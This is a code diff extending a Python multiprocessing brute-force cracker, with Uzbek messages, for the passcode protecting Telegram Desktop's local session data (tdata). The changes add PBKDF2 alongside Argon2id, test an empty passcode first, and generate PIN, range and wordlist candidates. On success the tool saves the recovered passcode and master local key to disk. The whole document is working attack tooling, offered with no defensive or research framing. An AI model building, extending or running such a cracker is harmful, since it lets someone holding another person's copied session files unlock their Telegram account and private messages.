@@ -1,6 +1,7 @@
 """
-Telegram KD2 Passcode Cracker (Multiprocessing Engine)
-High-performance brute-force engine for Telegram Desktop's KD2 (Argon2id + AES-IGE) local storage protection.
+Telegram KD2 & PBKDF2 Passcode Cracker (Multiprocessing Engine)
+High-performance brute-force engine for Telegram Desktop's KD2 (Argon2id + AES-IGE)
+and Legacy/Standard (PBKDF2-HMAC-SHA512 + AES-IGE) local storage protection.
 """
 
 import os
@@ -30,11 +31,11 @@ from core.hardware import get_system_specs, get_optimal_worker_count, set_proces
 
 
 # Top-level worker function for multiprocessing pickling
-def _worker_check_batch(args: Tuple[List[str], bytes, bytes, bytes, int, int]) -> Optional[Tuple[str, bytes]]:
+def _worker_check_batch(args: Tuple[List[str], bytes, bytes, bytes, int, int, int]) -> Optional[Tuple[str, bytes]]:
     # Set low process priority so the OS UI and other tasks remain completely smooth
     set_process_low_priority()
 
-    batch, salt, key128, ciphertext, time_c, mem_c = args
+    batch, salt, key128, ciphertext, time_c, mem_c, kdf_id = args
     for candidate in batch:
         ok, local_key = verify_kd2_candidate(
             candidate,
@@ -43,6 +44,7 @@ def _worker_check_batch(args: Tuple[List[str], bytes, bytes, bytes, int, int]) -
             ciphertext,
             time_cost=time_c,
             memory_cost=mem_c,
+            kdf_id=kdf_id,
         )
         if ok and local_key is not None:
             return candidate, local_key
@@ -51,14 +53,15 @@ def _worker_check_batch(args: Tuple[List[str], bytes, bytes, bytes, int, int]) -
 
 class KD2Cracker:
     """
-    Multithreaded / Multiprocessing Brute-force cracker for Telegram KD2.
+    Multithreaded / Multiprocessing Brute-force cracker for Telegram KD2 & PBKDF2.
     Dynamically scales workers according to CPU threads and available physical RAM.
     """
 
     def __init__(self, kd2_info: KD2Info, max_workers: Optional[int] = None):
         self.kd2 = kd2_info
+        mem_per_worker = max(32, (kd2_info.memory_cost // 1024) + 32)
         self.max_workers, self.hardware_reason = get_optimal_worker_count(
-            memory_per_worker_mb=96,
+            memory_per_worker_mb=mem_per_worker,
             user_override=max_workers,
         )
 
@@ -67,7 +70,7 @@ class KD2Cracker:
         source_path = Path(source)
         if source_path.is_file() and source_path.suffix.lower() == ".zip":
             kd2_info, _ = TDataParser.load_from_zip(source_path)
-        elif source_path.is_file() and source_path.name == "key_datas":
+        elif source_path.is_file() and source_path.name.startswith("key_data"):
             kd2_info = TDataParser.parse_kd2(source_path.read_bytes())
         elif source_path.is_dir():
             kd2_info, _ = TDataParser.load_from_dir(source_path)
@@ -82,30 +85,62 @@ class KD2Cracker:
         output_dir: Optional[Union[str, Path]] = None,
     ) -> Optional[Tuple[str, bytes]]:
         out_dir = Path(output_dir) if output_dir else Path.cwd()
+        out_dir.mkdir(parents=True, exist_ok=True)
         total = len(candidates)
         if total == 0:
             print("⚠️ Tekshirish uchun kombinatsiyalar ro'yxati bo'sh!")
             return None
+
+        # Quick check: test empty passcode ("") first in case account has no local passcode
+        ok_empty, lk_empty = verify_kd2_candidate(
+            "",
+            self.kd2.salt,
+            self.kd2.key128,
+            self.kd2.ciphertext,
+            time_cost=self.kd2.time_cost,
+            memory_cost=self.kd2.memory_cost,
+            kdf_id=self.kd2.kdf_id,
+        )
+        if ok_empty and lk_empty is not None:
+            print("\n" + "=" * 65)
+            print("🎉 AKKAUNTDA LOKAL PAROL O'RNATILMAGAN (Bo'sh parol '')!")
+            print(f"Master LocalKey: {lk_empty[:16].hex()}... ({len(lk_empty)} bayt)")
+            print("=" * 65 + "\n")
+            (out_dir / "found_passcode.txt").write_text("\n", encoding="utf-8")
+            (out_dir / "found_local_key.bin").write_bytes(lk_empty)
+            return "", lk_empty
 
         # Auto-compute dynamic batch size based on candidates and workers
         if batch_size is None or batch_size <= 0:
             batch_size = max(1, min(50, total // (self.max_workers * 4)))
 
         specs = get_system_specs()
+        kdf_name = "KD2 Argon2id" if self.kd2.kdf_id != 0 else "PBKDF2-HMAC-SHA512"
         print("=" * 65)
-        print("Telegram KD2 Argon2id Multi-Core Cracker")
+        print(f"Telegram {kdf_name} Multi-Core Cracker")
         print(f"Tizim               : {specs['os']} {specs['release']} ({specs['arch']})")
         print(f"Jami kombinatsiyalar: {total:,}")
         print(f"Hardware tahlili    : {self.hardware_reason}")
         print(f"Paket hajmi (batch) : {batch_size} ta har bir topshiriqqa")
-        print(f"Argon2 xotira sarfi : {self.kd2.memory_cost // 1024} MB per attempt")
-        print(f"Argon2 qadamlari    : {self.kd2.time_cost} iteratsiya")
+        if self.kd2.kdf_id != 0:
+            print(f"Argon2 xotira sarfi : {self.kd2.memory_cost // 1024} MB per attempt")
+            print(f"Argon2 qadamlari    : {self.kd2.time_cost} iteratsiya")
+        else:
+            print(f"PBKDF2 qadamlari    : {self.kd2.time_cost:,} iteratsiya")
         print("=" * 65)
 
         t0 = time.time()
         batches = [candidates[i : i + batch_size] for i in range(0, total, batch_size)]
         task_args = [
-            (b, self.kd2.salt, self.kd2.key128, self.kd2.ciphertext, self.kd2.time_cost, self.kd2.memory_cost)
+            (
+                b,
+                self.kd2.salt,
+                self.kd2.key128,
+                self.kd2.ciphertext,
+                self.kd2.time_cost,
+                self.kd2.memory_cost,
+                self.kd2.kdf_id,
+            )
             for b in batches
         ]
 
@@ -160,11 +195,12 @@ class KD2Cracker:
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Telegram KD2 Passcode Cracker")
+    parser = argparse.ArgumentParser(description="Telegram KD2 & PBKDF2 Passcode Cracker")
     parser.add_argument("--source", "-s", required=True, help="Telegram backup ZIP fayli yoki tdata papkasi")
     parser.add_argument("--mode", "-m", choices=["pin4", "pin6", "range", "wordlist"], default="pin4", help="Qidiruv rejimi (standart: pin4)")
     parser.add_argument("--start", type=int, default=0, help="Range rejimi uchun boshlang'ich son")
     parser.add_argument("--end", type=int, default=9999, help="Range rejimi uchun tugash soni")
+    parser.add_argument("--digits", "-d", type=int, default=None, help="Range rejimi uchun raqamlar uzunligi (masalan: 4 yoki 6)")
     parser.add_argument("--wordlist", "-w", type=str, help="So'zlar ro'yxati fayli (.txt)")
     parser.add_argument("--threads", "-t", type=int, default=None, help="CPU yadrolari soni (standart: avtomatik)")
     parser.add_argument("--output", "-o", type=str, default=".", help="Natijalarni saqlash papkasi")
@@ -177,7 +213,8 @@ def main():
     elif args.mode == "pin6":
         candidates = [f"{i:06d}" for i in range(1000000)]
     elif args.mode == "range":
-        candidates = [f"{i:04d}" for i in range(args.start, args.end + 1)]
+        width = args.digits if args.digits else max(4, len(str(args.end)))
+        candidates = [f"{i:0{width}d}" for i in range(args.start, args.end + 1)]
     elif args.mode == "wordlist":
         if not args.wordlist or not Path(args.wordlist).exists():
             print(f"❌ Wordlist fayli topilmadi: {args.wordlist}")
